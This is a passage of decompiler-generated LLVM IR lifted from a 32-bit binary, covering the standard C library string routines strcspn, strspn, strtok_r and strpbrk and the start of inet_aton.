  %v1_806563c = and i32 %v2_806563a, -2130640640
  %v2_806563c = icmp eq i32 %v1_806563c, 0
  br i1 %v2_806563c, label %dec_label_pc_8065674, label %dec_label_pc_8065644

dec_label_pc_8065644:                             ; preds = %dec_label_pc_806562a
  %v7_8065644 = or i32 %v1_806563c, %v4_80655e9
  %v1_8065648 = add i32 %v0_806562a55, -1
  %v2_806564b = inttoptr i32 %v1_8065648 to i8*
  %v3_806564b = load i8, i8* %v2_806564b, align 1
  %v16_806564b = icmp eq i8 %v3_806564b, %tmp
  br i1 %v16_806564b, label %dec_label_pc_8065691, label %dec_label_pc_8065650

dec_label_pc_8065650:                             ; preds = %dec_label_pc_8065644
  %v1_8065654 = add i32 %v0_806562a55, -2
  %v2_8065657 = inttoptr i32 %v1_8065654 to i8*
  %v3_8065657 = load i8, i8* %v2_8065657, align 1
  %v16_8065657 = icmp eq i8 %v3_8065657, %tmp
  br i1 %v16_8065657, label %dec_label_pc_8065691, label %dec_label_pc_806565c

dec_label_pc_806565c:                             ; preds = %dec_label_pc_8065650
  %v1_8065660 = add i32 %v0_806562a55, -3
  %v2_8065663 = inttoptr i32 %v1_8065660 to i8*
  %v3_8065663 = load i8, i8* %v2_8065663, align 1
  %v16_8065663 = icmp eq i8 %v3_8065663, %tmp
  br i1 %v16_8065663, label %dec_label_pc_8065691, label %dec_label_pc_8065668

dec_label_pc_8065668:                             ; preds = %dec_label_pc_806565c
  %v1_806566c = inttoptr i32 %v1_806562a to i8*
  %v2_806566c = load i8, i8* %v1_806566c, align 1
  %v15_806566c = icmp eq i8 %v2_806566c, %tmp
  %v1_806566e = icmp eq i1 %v15_806566c, false
  br i1 %v1_806566e, label %dec_label_pc_8065674, label %dec_label_pc_8065670

dec_label_pc_8065670:                             ; preds = %dec_label_pc_8065668
  br label %dec_label_pc_8065691

dec_label_pc_8065674:                             ; preds = %dec_label_pc_8065668, %dec_label_pc_806562a
  %v5_806568127 = phi i32 [ %v7_8065644, %dec_label_pc_8065668 ], [ 0, %dec_label_pc_806562a ]
  %v1_8065674 = add i32 %v0_806567456, -4
  %v6_806567a = icmp ugt i32 %v1_8065674, 3
  br i1 %v6_806567a, label %dec_label_pc_806562a, label %dec_label_pc_806567c

dec_label_pc_806567c:                             ; preds = %dec_label_pc_8065674, %dec_label_pc_8065613
  %v5_806568126.lcssa = phi i32 [ %v4_80655e9, %dec_label_pc_8065613 ], [ %v5_806568127, %dec_label_pc_8065674 ]
  %v0_806562a.lcssa = phi i32 [ %v0_8065618, %dec_label_pc_8065613 ], [ %v1_806562a, %dec_label_pc_8065674 ]
  %v0_8065674.lcssa = phi i32 [ %v0_8065677.pr, %dec_label_pc_8065613 ], [ %v1_8065674, %dec_label_pc_8065674 ]
  br label %dec_label_pc_8065689

dec_label_pc_8065680:                             ; preds = %dec_label_pc_8065689
  %v1_8065689 = add i32 %v0_8065689, -1
  %v1_8065680 = add i32 %v0_8065680, -1
  %v6_8065681 = and i32 %v5_8065681, -256
  %v7_8065681 = or i32 %v6_8065681, %v4_80655e9
  %v1_8065685 = inttoptr i32 %v1_8065680 to i8*
  %v2_8065685 = load i8, i8* %v1_8065685, align 1
  %v15_8065685 = icmp eq i8 %v2_8065685, %tmp
  br i1 %v15_8065685, label %dec_label_pc_8065691, label %dec_label_pc_8065689

dec_label_pc_8065689:                             ; preds = %dec_label_pc_8065680, %dec_label_pc_806567c
  %v5_8065681 = phi i32 [ %v7_8065681, %dec_label_pc_8065680 ], [ %v5_806568126.lcssa, %dec_label_pc_806567c ]
  %v0_8065680 = phi i32 [ %v1_8065680, %dec_label_pc_8065680 ], [ %v0_806562a.lcssa, %dec_label_pc_806567c ]
  %v0_8065689 = phi i32 [ %v1_8065689, %dec_label_pc_8065680 ], [ %v0_8065674.lcssa, %dec_label_pc_806567c ]
  %v10_806568a = icmp eq i32 %v0_8065689, 0
  %v1_806568d = icmp eq i1 %v10_806568a, false
  br i1 %v1_806568d, label %dec_label_pc_8065680, label %dec_label_pc_806568f

dec_label_pc_806568f:                             ; preds = %dec_label_pc_8065689
  br label %dec_label_pc_8065691

dec_label_pc_8065691:                             ; preds = %dec_label_pc_80655fd, %dec_label_pc_806565c, %dec_label_pc_8065650, %dec_label_pc_8065644, %dec_label_pc_8065680, %dec_label_pc_8065670, %dec_label_pc_806568f
  %v0_8065694 = phi i32 [ %v1_806562a, %dec_label_pc_8065670 ], [ 0, %dec_label_pc_806568f ], [ %v1_8065680, %dec_label_pc_8065680 ], [ %v1_8065660, %dec_label_pc_806565c ], [ %v1_8065654, %dec_label_pc_8065650 ], [ %v1_8065648, %dec_label_pc_8065644 ], [ %v1_80655fd, %dec_label_pc_80655fd ]
  ret i32 %v0_8065694

; uselistorder directives
  uselistorder i32 %v0_8065689, { 1, 0 }
  uselistorder i32 %v1_8065674, { 0, 2, 1 }
  uselistorder i32 %v1_806562a, { 2, 0, 3, 4, 5, 1 }
  uselistorder i32 %v0_806562a55, { 3, 2, 1, 0 }
  uselistorder i32 %v2_806561f, { 1, 0 }
  uselistorder i32 %v0_80655fd, { 1, 0, 2 }
  uselistorder i32 %v2_80655f9, { 1, 0 }
  uselistorder i32 %v4_80655e9, { 4, 5, 3, 2, 0, 1 }
  uselistorder i8 %tmp, { 5, 1, 2, 3, 4, 0 }
  uselistorder i32 -2130640640, { 1, 0 }
  uselistorder i32 %arg3, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8065691, { 6, 4, 5, 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_806562a, { 1, 0 }
  uselistorder label %dec_label_pc_8065613, { 1, 0, 2 }
  uselistorder label %dec_label_pc_806560f, { 1, 0 }
}

define i32 @strcspn() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp5 = call i8* @__decompiler_undefined_function_2()
  %stack_var_-12 = alloca i32, align 4
  %v0_8065699 = load i32, i32* @esi, align 4
  store i32 0, i32* @esi, align 4
  %v0_806569c = load i32, i32* @ebx, align 4
  store i32 %v0_806569c, i32* %stack_var_-12, align 4
  %v4_806569d = ptrtoint i8* %tmp5 to i32
  store i32 %v4_806569d, i32* %ebx.global-to-local, align 4
  store i32 %tmp, i32* %edi.global-to-local, align 4
  %v2_80656bc16 = load i8, i8* %tmp5, align 1
  %v4_80656be18 = icmp eq i8 %v2_80656bc16, 0
  %v1_80656c020 = icmp eq i1 %v4_80656be18, false
  br i1 %v1_80656c020, label %dec_label_pc_80656a7, label %dec_label_pc_80656c2

dec_label_pc_80656a7:                             ; preds = %entry, %dec_label_pc_80656ba.dec_label_pc_80656a7_crit_edge
  %v0_80656ad = phi i32 [ %v0_80656ad.pre, %dec_label_pc_80656ba.dec_label_pc_80656a7_crit_edge ], [ %tmp, %entry ]
  %v3_80656bc21.in = phi i8 [ %v2_80656bc, %dec_label_pc_80656ba.dec_label_pc_80656a7_crit_edge ], [ %v2_80656bc16, %entry ]
  %v3_80656bc21 = zext i8 %v3_80656bc21.in to i32
  %v2_80656ae = inttoptr i32 %v0_80656ad to i8*
  %v3_80656ae = call i32 @__GI_strchr(i8* %v2_80656ae, i32 %v3_80656bc21)
  %v1_80656b6 = icmp eq i32 %v3_80656ae, 0
  %v1_80656b8 = icmp eq i1 %v1_80656b6, false
  br i1 %v1_80656b8, label %dec_label_pc_80656a7.dec_label_pc_80656c2_crit_edge, label %dec_label_pc_80656ba

dec_label_pc_80656a7.dec_label_pc_80656c2_crit_edge: ; preds = %dec_label_pc_80656a7
  %v0_80656c3.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_80656c2

dec_label_pc_80656ba:                             ; preds = %dec_label_pc_80656a7
  %v0_80656ba = load i32, i32* %ebx.global-to-local, align 4
  %v1_80656ba = add i32 %v0_80656ba, 1
  store i32 %v1_80656ba, i32* %ebx.global-to-local, align 4
  %v0_80656bb = load i32, i32* @esi, align 4
  %v1_80656bb = add i32 %v0_80656bb, 1
  store i32 %v1_80656bb, i32* @esi, align 4
  %v1_80656bc = inttoptr i32 %v1_80656ba to i8*
  %v2_80656bc = load i8, i8* %v1_80656bc, align 1
  %v4_80656be = icmp eq i8 %v2_80656bc, 0
  %v1_80656c0 = icmp eq i1 %v4_80656be, false
  br i1 %v1_80656c0, label %dec_label_pc_80656ba.dec_label_pc_80656a7_crit_edge, label %dec_label_pc_80656c2

dec_label_pc_80656ba.dec_label_pc_80656a7_crit_edge: ; preds = %dec_label_pc_80656ba
  %v0_80656ad.pre = load i32, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_80656a7

dec_label_pc_80656c2:                             ; preds = %entry, %dec_label_pc_80656ba, %dec_label_pc_80656a7.dec_label_pc_80656c2_crit_edge
  %v0_80656c3 = phi i32 [ %v0_80656c3.pre, %dec_label_pc_80656a7.dec_label_pc_80656c2_crit_edge ], [ 0, %entry ], [ %v1_80656bb, %dec_label_pc_80656ba ]
  %v2_80656c2 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_80656c2, i32* @ebx, align 4
  store i32 %v0_8065699, i32* @esi, align 4
  ret i32 %v0_80656c3

; uselistorder directives
  uselistorder i8 %v2_80656bc, { 1, 0 }
  uselistorder label %dec_label_pc_80656c2, { 1, 2, 0 }
  uselistorder label %dec_label_pc_80656a7, { 1, 0 }
}

define i32 @__GI_strspn(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v0_80656cb = load i32, i32* @ebx, align 4
  %v2_80656e129 = load i8, i8* %arg1, align 1
  %v4_80656e333 = icmp eq i8 %v2_80656e129, 0
  br i1 %v4_80656e333, label %dec_label_pc_80656ed, label %dec_label_pc_80656d7.preheader.lr.ph

dec_label_pc_80656d7.preheader.lr.ph:             ; preds = %entry
  %v3_80656e130 = zext i8 %v2_80656e129 to i32
  %v5_80656e131 = and i32 %v0_80656cb, -256
  %v6_80656e132 = or i32 %v3_80656e130, %v5_80656e131
  %v4_80656cc = ptrtoint i8* %arg1 to i32
  %v1_80656d716 = inttoptr i32 %arg2 to i8*
  %v4_80656d7.pre.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_80656d7.preheader

dec_label_pc_80656d2:                             ; preds = %dec_label_pc_80656d7.preheader, %dec_label_pc_80656d6
  %v6_80656d726 = phi i32 [ %v6_80656d7, %dec_label_pc_80656d6 ], [ %v6_80656d720, %dec_label_pc_80656d7.preheader ]
  %v2_80656d725 = phi i8 [ %v2_80656d7, %dec_label_pc_80656d6 ], [ %v2_80656d717, %dec_label_pc_80656d7.preheader ]
  %v0_80656d624 = phi i32 [ %v1_80656d6, %dec_label_pc_80656d6 ], [ %arg2, %dec_label_pc_80656d7.preheader ]
  %v15_80656d2 = icmp eq i8 %v2_80656e137, %v2_80656d725
  br i1 %v15_80656d2, label %dec_label_pc_80656df, label %dec_label_pc_80656d6

dec_label_pc_80656d6:                             ; preds = %dec_label_pc_80656d2
  %v1_80656d6 = add i32 %v0_80656d624, 1
  store i32 %v1_80656d6, i32* @edx, align 4
  %v1_80656d7 = inttoptr i32 %v1_80656d6 to i8*
  %v2_80656d7 = load i8, i8* %v1_80656d7, align 1
  %v3_80656d7 = zext i8 %v2_80656d7 to i32
  %v5_80656d7 = and i32 %v6_80656d726, -256
  %v6_80656d7 = or i32 %v3_80656d7, %v5_80656d7
  store i32 %v6_80656d7, i32* @ecx, align 4
  %v4_80656d9 = icmp eq i8 %v2_80656d7, 0
  %v1_80656db = icmp eq i1 %v4_80656d9, false
  br i1 %v1_80656db, label %dec_label_pc_80656d2, label %dec_label_pc_80656ed

dec_label_pc_80656df:                             ; preds = %dec_label_pc_80656d2
  %v1_80656df = add i32 %v0_80656ee35, 1
  %v1_80656e0 = add i32 %v0_80656e036, 1
  %v1_80656e1 = inttoptr i32 %v1_80656e0 to i8*
  %v2_80656e1 = load i8, i8* %v1_80656e1, align 1
  %v3_80656e1 = zext i8 %v2_80656e1 to i32
  %v5_80656e1 = and i32 %v6_80656e138, -256
  %v6_80656e1 = or i32 %v3_80656e1, %v5_80656e1
  %v4_80656e3 = icmp eq i8 %v2_80656e1, 0
  br i1 %v4_80656e3, label %dec_label_pc_80656ed, label %dec_label_pc_80656d7.preheader

dec_label_pc_80656d7.preheader:                   ; preds = %dec_label_pc_80656d7.preheader.lr.ph, %dec_label_pc_80656df
  %v4_80656d7.pre = phi i32 [ %v4_80656d7.pre.pre, %dec_label_pc_80656d7.preheader.lr.ph ], [ %v6_80656d726, %dec_label_pc_80656df ]
  %v6_80656e138 = phi i32 [ %v6_80656e132, %dec_label_pc_80656d7.preheader.lr.ph ], [ %v6_80656e1, %dec_label_pc_80656df ]
  %v2_80656e137 = phi i8 [ %v2_80656e129, %dec_label_pc_80656d7.preheader.lr.ph ], [ %v2_80656e1, %dec_label_pc_80656df ]
  %v0_80656e036 = phi i32 [ %v4_80656cc, %dec_label_pc_80656d7.preheader.lr.ph ], [ %v1_80656e0, %dec_label_pc_80656df ]
  %v0_80656ee35 = phi i32 [ 0, %dec_label_pc_80656d7.preheader.lr.ph ], [ %v1_80656df, %dec_label_pc_80656df ]
  store i32 %arg2, i32* @edx, align 4
  %v2_80656d717 = load i8, i8* %v1_80656d716, align 1
  %v3_80656d718 = zext i8 %v2_80656d717 to i32
  %v5_80656d719 = and i32 %v4_80656d7.pre, -256
  %v6_80656d720 = or i32 %v3_80656d718, %v5_80656d719
  store i32 %v6_80656d720, i32* @ecx, align 4
  %v4_80656d921 = icmp eq i8 %v2_80656d717, 0
  %v1_80656db23 = icmp eq i1 %v4_80656d921, false
  br i1 %v1_80656db23, label %dec_label_pc_80656d2, label %dec_label_pc_80656ed

dec_label_pc_80656ed:                             ; preds = %entry, %dec_label_pc_80656df, %dec_label_pc_80656d7.preheader, %dec_label_pc_80656d6
  %v0_80656ee15 = phi i32 [ %v0_80656ee35, %dec_label_pc_80656d6 ], [ %v0_80656ee35, %dec_label_pc_80656d7.preheader ], [ 0, %entry ], [ %v1_80656df, %dec_label_pc_80656df ]
  store i32 %v0_80656cb, i32* @ebx, align 4
  ret i32 %v0_80656ee15

; uselistorder directives
  uselistorder i32 %v6_80656d720, { 1, 0 }
  uselistorder i8 %v2_80656d717, { 1, 2, 0 }
  uselistorder i32 %v1_80656e0, { 1, 0 }
  uselistorder i32 %v6_80656d7, { 1, 0 }
  uselistorder i8 %v2_80656d7, { 1, 2, 0 }
  uselistorder i32 %v1_80656d6, { 2, 1, 0 }
  uselistorder i8 %v2_80656e129, { 0, 2, 1 }
  uselistorder i32 %v0_80656cb, { 1, 0 }
  uselistorder i32 %arg2, { 2, 0, 1 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_80656ed, { 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_80656d7.preheader, { 1, 0 }
}

define i32 @strtok_r(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_80656f4 = load i32, i32* @edi, align 4
  %v0_80656f5 = load i32, i32* @esi, align 4
  %v0_80656f6 = load i32, i32* @ebx, align 4
  store i32 %v0_80656f6, i32* %stack_var_-12, align 4
  %v4_80656f7 = ptrtoint i8* %arg1 to i32
  store i32 %v4_80656f7, i32* @ebx, align 4
  store i32 %arg2, i32* @edi, align 4
  store i32 %arg3, i32* @esi, align 4
  %v1_8065703 = icmp eq i8* %arg1, null
  %v1_8065705 = icmp eq i1 %v1_8065703, false
  br i1 %v1_8065705, label %dec_label_pc_8065709, label %dec_label_pc_8065707

dec_label_pc_8065707:                             ; preds = %entry
  %v1_8065707 = inttoptr i32 %arg3 to i32*
  %v2_8065707 = load i32, i32* %v1_8065707, align 4
  store i32 %v2_8065707, i32* @ebx, align 4
  br label %dec_label_pc_8065709

dec_label_pc_8065709:                             ; preds = %entry, %dec_label_pc_8065707
  %v0_806570c = phi i32 [ %v4_80656f7, %entry ], [ %v2_8065707, %dec_label_pc_8065707 ]
  %v0_8065709 = load i32, i32* @ecx, align 4
  %v5_806570c = inttoptr i32 %v0_806570c to i8*
  %v8_806570d = call i32 @__GI_strspn(i8* %v5_806570c, i32 %arg2, i32 %v0_8065709, i32 %v0_8065709)
  store i32 %v8_806570d, i32* %eax.global-to-local, align 4
  %v0_8065715 = load i32, i32* @ebx, align 4
  %v2_8065715 = add i32 %v0_8065715, %v8_806570d
  store i32 %v2_8065715, i32* @ebx, align 4
  %v1_8065717 = inttoptr i32 %v2_8065715 to i8*
  %v2_8065717 = load i8, i8* %v1_8065717, align 1
  %v3_8065717 = icmp eq i8 %v2_8065717, 0
  %v1_806571a = icmp eq i1 %v3_8065717, false
  br i1 %v1_806571a, label %dec_label_pc_8065722, label %dec_label_pc_806571c

dec_label_pc_806571c:                             ; preds = %dec_label_pc_8065709
  store i32 0, i32* %eax.global-to-local, align 4
  %v1_806571e = load i32, i32* @esi, align 4
  %v2_806571e = inttoptr i32 %v1_806571e to i32*
  store i32 %v2_8065715, i32* %v2_806571e, align 4
  %v0_806574c.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8065749

dec_label_pc_8065722:                             ; preds = %dec_label_pc_8065709
  %v0_8065722 = load i32, i32* @edx, align 4
  %v0_8065724 = load i32, i32* @edi, align 4
  %v8_8065726 = call i32 @__GI_strpbrk(i8* %v1_8065717, i32 %v0_8065724, i32 %v0_8065722, i32 %v0_8065722)
  store i32 %v8_8065726, i32* %eax.global-to-local, align 4
  %v2_806572e = icmp eq i32 %v8_8065726, 0
  %v1_8065730 = icmp eq i1 %v2_806572e, false
  br i1 %v1_8065730, label %dec_label_pc_8065741, label %dec_label_pc_8065732

dec_label_pc_8065732:                             ; preds = %dec_label_pc_8065722
  %v0_8065736 = load i32, i32* @ebx, align 4
  %v5_8065736 = inttoptr i32 %v0_8065736 to i8*
  %v8_8065737 = call i32 @rawmemchr(i8* %v5_8065736, i32 0, i32 %v8_8065726, i32 %v8_8065726)
  br label %dec_label_pc_8065745

dec_label_pc_8065741:                             ; preds = %dec_label_pc_8065722
  %v9_8065726 = inttoptr i32 %v8_8065726 to i8*
  store i8 0, i8* %v9_8065726, align 1
  %v2_8065744 = add i32 %v8_8065726, 1
  br label %dec_label_pc_8065745

dec_label_pc_8065745:                             ; preds = %dec_label_pc_8065732, %dec_label_pc_8065741
  %storemerge = phi i32 [ %v2_8065744, %dec_label_pc_8065741 ], [ %v8_8065737, %dec_label_pc_8065732 ]
  %v0_8065745 = phi i32 [ %v2_8065744, %dec_label_pc_8065741 ], [ %v8_8065737, %dec_label_pc_8065732 ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  %v1_8065745 = load i32, i32* @esi, align 4
  %v2_8065745 = inttoptr i32 %v1_8065745 to i32*
  store i32 %v0_8065745, i32* %v2_8065745, align 4
  %v0_8065747 = load i32, i32* @ebx, align 4
  store i32 %v0_8065747, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8065749

dec_label_pc_8065749:                             ; preds = %dec_label_pc_806571c, %dec_label_pc_8065745
  %v0_806574c = phi i32 [ %v0_806574c.pre, %dec_label_pc_806571c ], [ %v0_8065747, %dec_label_pc_8065745 ]
  %v2_8065749 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8065749, i32* @ebx, align 4
  store i32 %v0_80656f5, i32* @esi, align 4
  store i32 %v0_80656f4, i32* @edi, align 4
  ret i32 %v0_806574c

; uselistorder directives
  uselistorder i32 %v8_8065726, { 3, 5, 0, 1, 2, 4 }
  uselistorder i32* %eax.global-to-local, { 1, 0, 2, 3, 4, 5 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8065749, { 1, 0 }
  uselistorder label %dec_label_pc_8065745, { 1, 0 }
  uselistorder label %dec_label_pc_8065709, { 1, 0 }
}

define i32 @__GI_strpbrk(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v0_8065750 = load i32, i32* @ebx, align 4
  %v2_806576323 = load i8, i8* %arg1, align 1
  %v4_806576527 = icmp eq i8 %v2_806576323, 0
  br i1 %v4_806576527, label %dec_label_pc_806576f, label %dec_label_pc_806575c.preheader.lr.ph

dec_label_pc_806575c.preheader.lr.ph:             ; preds = %entry
  %v3_806576324 = zext i8 %v2_806576323 to i32
  %v5_806576325 = and i32 %v0_8065750, -256
  %v6_806576326 = or i32 %v3_806576324, %v5_806576325
  %v4_8065751 = ptrtoint i8* %arg1 to i32
  %v1_806575c11 = inttoptr i32 %arg2 to i8*
  %v4_806575c.pre.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_806575c.preheader

dec_label_pc_8065757:                             ; preds = %dec_label_pc_806575c.preheader, %dec_label_pc_806575b
  %v6_806575c21 = phi i32 [ %v6_806575c, %dec_label_pc_806575b ], [ %v6_806575c15, %dec_label_pc_806575c.preheader ]
  %v2_806575c20 = phi i8 [ %v2_806575c, %dec_label_pc_806575b ], [ %v2_806575c12, %dec_label_pc_806575c.preheader ]
  %v0_806575b19 = phi i32 [ %v1_806575b, %dec_label_pc_806575b ], [ %arg2, %dec_label_pc_806575c.preheader ]
  %v15_8065757 = icmp eq i8 %v2_806575c20, %v2_806576331
  br i1 %v15_8065757, label %dec_label_pc_8065771, label %dec_label_pc_806575b

dec_label_pc_806575b:                             ; preds = %dec_label_pc_8065757
  %v1_806575b = add i32 %v0_806575b19, 1
  store i32 %v1_806575b, i32* @edx, align 4
  %v1_806575c = inttoptr i32 %v1_806575b to i8*
  %v2_806575c = load i8, i8* %v1_806575c, align 1
  %v3_806575c = zext i8 %v2_806575c to i32
  %v5_806575c = and i32 %v6_806575c21, -256
  %v6_806575c = or i32 %v3_806575c, %v5_806575c
  store i32 %v6_806575c, i32* @ecx, align 4
  %v4_806575e = icmp eq i8 %v2_806575c, 0
  %v1_8065760 = icmp eq i1 %v4_806575e, false
  br i1 %v1_8065760, label %dec_label_pc_8065757, label %dec_label_pc_8065762

dec_label_pc_8065762:                             ; preds = %dec_label_pc_806575b, %dec_label_pc_806575c.preheader
  %v4_806575c.pre34 = phi i32 [ %v6_806575c15, %dec_label_pc_806575c.preheader ], [ %v6_806575c, %dec_label_pc_806575b ]
  %v1_8065762 = add i32 %v0_806576229, 1
  %v1_8065763 = inttoptr i32 %v1_8065762 to i8*
  %v2_8065763 = load i8, i8* %v1_8065763, align 1
  %v3_8065763 = zext i8 %v2_8065763 to i32
  %v5_8065763 = and i32 %v6_806576332, -256
  %v6_8065763 = or i32 %v3_8065763, %v5_8065763
  %v4_8065765 = icmp eq i8 %v2_8065763, 0
  br i1 %v4_8065765, label %dec_label_pc_806576f, label %dec_label_pc_806575c.preheader

dec_label_pc_806575c.preheader:                   ; preds = %dec_label_pc_806575c.preheader.lr.ph, %dec_label_pc_8065762
  %v4_806575c.pre = phi i32 [ %v4_806575c.pre.pre, %dec_label_pc_806575c.preheader.lr.ph ], [ %v4_806575c.pre34, %dec_label_pc_8065762 ]
  %v6_806576332 = phi i32 [ %v6_806576326, %dec_label_pc_806575c.preheader.lr.ph ], [ %v6_8065763, %dec_label_pc_8065762 ]
  %v2_806576331 = phi i8 [ %v2_806576323, %dec_label_pc_806575c.preheader.lr.ph ], [ %v2_8065763, %dec_label_pc_8065762 ]
  %v0_806576229 = phi i32 [ %v4_8065751, %dec_label_pc_806575c.preheader.lr.ph ], [ %v1_8065762, %dec_label_pc_8065762 ]
  store i32 %arg2, i32* @edx, align 4
  %v2_806575c12 = load i8, i8* %v1_806575c11, align 1
  %v3_806575c13 = zext i8 %v2_806575c12 to i32
  %v5_806575c14 = and i32 %v4_806575c.pre, -256
  %v6_806575c15 = or i32 %v3_806575c13, %v5_806575c14
  store i32 %v6_806575c15, i32* @ecx, align 4
  %v4_806575e16 = icmp eq i8 %v2_806575c12, 0
  %v1_806576018 = icmp eq i1 %v4_806575e16, false
  br i1 %v1_806576018, label %dec_label_pc_8065757, label %dec_label_pc_8065762

dec_label_pc_806576f:                             ; preds = %dec_label_pc_8065762, %entry
  br label %dec_label_pc_8065771

dec_label_pc_8065771:                             ; preds = %dec_label_pc_8065757, %dec_label_pc_806576f
  %v0_8065772 = phi i32 [ 0, %dec_label_pc_806576f ], [ %v0_806576229, %dec_label_pc_8065757 ]
  store i32 %v0_8065750, i32* @ebx, align 4
  ret i32 %v0_8065772

; uselistorder directives
  uselistorder i32 %v6_806575c15, { 2, 0, 1 }
  uselistorder i8 %v2_806575c12, { 1, 2, 0 }
  uselistorder i32 %v1_8065762, { 1, 0 }
  uselistorder i32 %v6_806575c, { 1, 2, 0 }
  uselistorder i8 %v2_806575c, { 1, 2, 0 }
  uselistorder i32 %v1_806575b, { 2, 1, 0 }
  uselistorder i8 %v2_806576323, { 0, 2, 1 }
  uselistorder i32 %v0_8065750, { 1, 0 }
  uselistorder i32 %arg2, { 2, 0, 1 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8065771, { 1, 0 }
  uselistorder label %dec_label_pc_806575c.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_8065762, { 1, 0 }
}

define i32 @inet_aton(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_806577f = icmp eq i8* %arg1, null
  br i1 %v1_806577f, label %dec_label_pc_8065800, label %dec_label_pc_8065783

dec_label_pc_8065783:                             ; preds = %entry
  %v4_806577b = ptrtoint i8* %arg1 to i32
  %v0_806578e.pre = load i32, i32* @global_var_8071900, align 256
  br label %dec_label_pc_806578e

dec_label_pc_806578e:                             ; preds = %dec_label_pc_8065783, %dec_label_pc_80657d7
  %v12_80657df36 = phi i1 [ false, %dec_label_pc_8065783 ], [ %v12_80657df, %dec_label_pc_80657d7 ]
  %v2_80657d734 = phi i32 [ 1, %dec_label_pc_8065783 ], [ %v3_80657d7, %dec_label_pc_80657d7 ]
  %v0_806579433 = phi i32 [ %v4_806577b, %dec_label_pc_8065783 ], [ %v0_80657943, %dec_label_pc_80657d7 ]
  %v0_80657f532 = phi i32 [ 0, %dec_label_pc_8065783 ], [ %v2_80657dd, %dec_label_pc_80657d7 ]
  %v1_8065794 = inttoptr i32 %v0_806579433 to i8*
  %v2_8065794 = load i8, i8* %v1_8065794, align 1
  %v3_8065794 = zext i8 %v2_8065794 to i32
  %v2_8065797 = mul nuw nsw i32 %v3_8065794, 2
  %v3_8065797 = add i32 %v2_8065797, %v0_806578e.pre
  %v4_8065797 = inttoptr i32 %v3_8065797 to i8*
  %v5_8065797 = load i8, i8* %v4_8065797, align 1
  %v6_8065797 = and i8 %v5_8065797, 8
  %v7_8065797 = icmp eq i8 %v6_8065797, 0
  br i1 %v7_8065797, label %dec_label_pc_8065800, label %dec_label_pc_806579e

dec_label_pc_806579e:                             ; preds = %dec_label_pc_806578e
  %v4_80657b2.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_80657b2

dec_label_pc_80657a2:                             ; preds = %dec_label_pc_80657b2
  %v3_80657a2 = mul i32 %v1_80657a2, 10
  %v2_80657a5 = add i32 %v3_80657a2, -48
  %v3_80657a5 = add i32 %v2_80657a5, %v3_80657b2
  %v1_80657a9 = add i32 %v3_80657a5, -255
  %v6_80657a9 = sub i32 254, %v3_80657a5
  %v7_80657a9 = and i32 %v6_80657a9, %v3_80657a5
  %v8_80657a9 = icmp slt i32 %v7_80657a9, 0
  %v9_80657a9 = icmp eq i32 %v1_80657a9, 0
  %v10_80657a9 = icmp slt i32 %v1_80657a9, 0
  %v3_80657af = icmp eq i1 %v10_80657a9, %v8_80657a9
  %v4_80657af = icmp eq i1 %v9_80657a9, false
  %v5_80657af = and i1 %v4_80657af, %v3_80657af
  br i1 %v5_80657af, label %dec_label_pc_8065800, label %dec_label_pc_80657b1

dec_label_pc_80657b1:                             ; preds = %dec_label_pc_80657a2
  %v1_80657b1 = add i32 %v0_80657b1, 1
  br label %dec_label_pc_80657b2

dec_label_pc_80657b2:                             ; preds = %dec_label_pc_806579e, %dec_label_pc_80657b1
  %v1_80657a2 = phi i32 [ 0, %dec_label_pc_806579e ], [ %v3_80657a5, %dec_label_pc_80657b1 ]
  %v4_80657b2 = phi i32 [ %v4_80657b2.pre, %dec_label_pc_806579e ], [ %v6_80657b2, %dec_label_pc_80657b1 ]
  %v0_80657b1 = phi i32 [ %v0_806579433, %dec_label_pc_806579e ], [ %v1_80657b1, %dec_label_pc_80657b1 ]
  %v1_80657b2 = inttoptr i32 %v0_80657b1 to i8*
  %v2_80657b2 = load i8, i8* %v1_80657b2, align 1
  %v3_80657b2 = zext i8 %v2_80657b2 to i32
  %v5_80657b2 = and i32 %v4_80657b2, -256
  %v6_80657b2 = or i32 %v3_80657b2, %v5_80657b2
  store i32 %v6_80657b2, i32* @edx, align 4
  %v2_80657b7 = mul nuw nsw i32 %v3_80657b2, 2
  %v3_80657b7 = add i32 %v2_80657b7, %v0_806578e.pre
  %v4_80657b7 = inttoptr i32 %v3_80657b7 to i16*
  %v5_80657b7 = load i16, i16* %v4_80657b7, align 2
  %v2_80657bc = and i16 %v5_80657b7, 8
  %v3_80657bc = icmp eq i16 %v2_80657bc, 0
  %v1_80657be = icmp eq i1 %v3_80657bc, false
  br i1 %v1_80657be, label %dec_label_pc_80657a2, label %dec_label_pc_80657c0

dec_label_pc_80657c0:                             ; preds = %dec_label_pc_80657b2
  br i1 %v12_80657df36, label %dec_label_pc_80657ce, label %dec_label_pc_80657c6

dec_label_pc_80657c6:                             ; preds = %dec_label_pc_80657c0
  %v10_80657c6 = icmp eq i8 %v2_80657b2, 46
  %v1_80657c9 = icmp eq i1 %v10_80657c6, false
